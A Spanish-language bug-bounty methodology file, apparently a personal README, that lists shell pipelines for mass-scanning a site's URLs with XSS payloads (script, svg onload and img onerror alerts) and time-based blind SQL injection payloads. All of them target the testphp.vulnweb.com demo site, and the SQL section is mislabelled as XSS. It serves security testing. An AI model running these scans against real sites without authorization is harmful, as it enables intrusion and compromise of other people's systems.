#nulldev96_Metodology

*Provando todas las herramientas para encontar posible "XSS"* 

|||||||||||||||||||||||||||||||_FIND "XSS" ===(BUG BOUNTY)====_||||||||||||||||||||||||||||||

    
#****_forma rapida de busqueda con  "echo | way | anew | cat | egrep | gf | qsreplace | while | curl | grep_****

     echo "testphp.vulnweb.com" | waybackurls | anew url1.txt ; cat url1.txt | egrep -iv ".(jpg|jpeg|git|css|tif|tiff|png|ttf|wolf|wolf2|ico|pdf|svg|txt|js)" | gf xss | qsreplace '"><script>confirm(1)</script>' | anew qsrepl2.json && cat qsrepl2.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable_xss\n" || echo "$host \033[0;32mNot Vulnerable\n#";done | grep "Vulnerable_xss" | tee vuln_xss

#****_Forma mas rapido con "echo | way | gf | qsreplace | while | curl | grep |"_****
     
     echo "testphp.vulnweb.com" | waybackurls | gf xss | qsreplace '"><script>confirm(1)</script>' | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable_xss\n" || echo "$host \033[0;32mNot Vulnerable\n#";done | grep "Vulnerable_xss"
              
#****_forma guardar salida con "echo | way | anew | cat | egrep | kxss | sed | dalfox"_****
      
      echo "testphp.vulnweb.com" | waybackurls | anew url1.txt ; cat url1.txt | egrep -iv ".(jpg|jpeg|git|css|tif|tiff|png|ttf|wolf|wolf2|ico|pdf|svg|txt|js|html)" > filtrado_url.txt && cat filtrado_url.txt | kxss | sed 's/=.*/=/' | sed 's/URL: //' | tee filtre.txt&& cat filtre.txt | dalfox pipe

#****_forma mas rapida con "echo | way | egrep | kxss | sed | dalfox"_****
      
      echo "testphp.vulnweb.com" | waybackurls | egrep -iv ".(jpg|jpeg|git|css|tif|tiff|png|ttf|wolf|wolf2|ico|pdf|svg|txt|js|html)" |  kxss | sed 's/=.*/=/' | sed 's/URL: //' | dalfox pipe

#****_echo | way | httpx | Gxss | dalfox_**** 
     
     echo "testphp.vulnweb.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | sort -u | dalfox p     

#****_Paramspider.py | qsreplace | airixss | grep_****
     
     /home/josema96/HackerOne/hunters_tools/TOOLS_funsion/tool_Search_parametro/ParamSpider/paramspider.py -d testphp.vulnweb.com -o param.txt ; cat output/param.txt | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | grep "Vulnerable To XSS "

#****_forma simple con "echo | way | dalfox"_****
     
     echo "http://testphp.vulnweb.com" | waybackurls | dalfox pipe

#****_way | urldedupe | bhedak |  airixss | egrep_****
     
     waybackurls testphp.vulnweb.com | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'

#****_echo | way | gf | uro | httpx | qsreplace | airixss | grep_****
     
     echo testphp.vulnweb.com | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | grep "Vulnerable To XSS"

#****_echo | way | gf | uro | qsreplace | airixss | grep_****
     
     echo testphp.vulnweb.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not' 

#****_waymore.py | cat | gf | dalfox_****
     
     python3 /root/waymore/waymore.py  -i testphp.vulnweb.com -mode U && cat /root/waymore/results/testphp.vulnweb.com/waymore.txt | gf xss | Gxss | dalfox pipe

#****_echo | cariddi | qsreplace | grep | airixss | grep_****
     
     echo "http://testphp.vulnweb.com" | cariddi | qsreplace '"><svg onload=confirm(1)>' | grep "=" | airixss -payload "confirm(1)" | grep "Vulnerable To XSS "

#****_time_tool ======> #waymore | cat | anew | qsreplay | airixss | grep_****
     
     python3 /root/waymore/waymore.py  -i testphp.vulnweb.com -mode U && cat /root/waymore/results/testphp.vulnweb.com/waymore.txt |  anew | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | grep "Vulnerable To XSS "

#****_time_tool ======> #waymore | cat | gf xss | qsreplay | freq | grep_****
     
     python3 /root/waymore/waymore.py  -i testphp.vulnweb.com -mode U && cat /root/waymore/results/testphp.vulnweb.com/waymore.txt | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not'

#****_time_tool ======> #katana | urldedupe | bhedak | airixss | egrep_****
     
     katana -u http://testphp.vulnweb.com -o crawlin.txt;cat crawlin.txt | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'


###################################################################################################################

  |||||||||||||||||||||||||||||||_FIND "XSS_BLING" ===(BUG BOUNTY)====_||||||||||||||||||||||||||||||

#****_echo | way | gf | qsreplace | jeecves | grep_****
     
     echo "http://testphp.vulnweb.com" | waybackurls | gf xss | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves --payload-time 5 | grep "Vulnerable To Time-Based SQLI"

#****_echo | way | jeeves | grep_****   
     
     echo "http://testphp.vulnweb.com" | waybackurls | jeeves --payload-time 5 | grep "Vulnerable To Time-Based"

#****_echo | way | gf | qsreplace | jeeves | grep_**** 
     
     echo "http://testphp.vulnweb.com" | waybackurls | gf xss | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves -t 5 -H "Testing: testing;OtherHeader: Value;Other2: Value" | grep "Vulnerable To Time-Based"

#****_cat | Seclists | while | echo | gau | qsreplace | jeeves_**** 
     
     cat /usr/share/wordlists/SecLists/Fuzzing/SQLi/Generic-BlindSQLi.fuzzdb.txt | while read payload;do echo http://testphp.vulnweb.com | gau | qsreplace $payload | jeeves -t 5;done
